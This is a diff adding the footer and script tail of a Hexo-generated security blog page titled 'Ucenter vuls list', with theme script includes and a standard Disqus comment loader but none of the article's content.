+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">groot</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://securitainment.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: {page: {
+            url: "http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/",
+            identifier: "2016/05/14/2016-05-14-ucenter-bug-list/",
+            title: "Ucenter vuls list"
+          }
+        }
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://securitainment.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
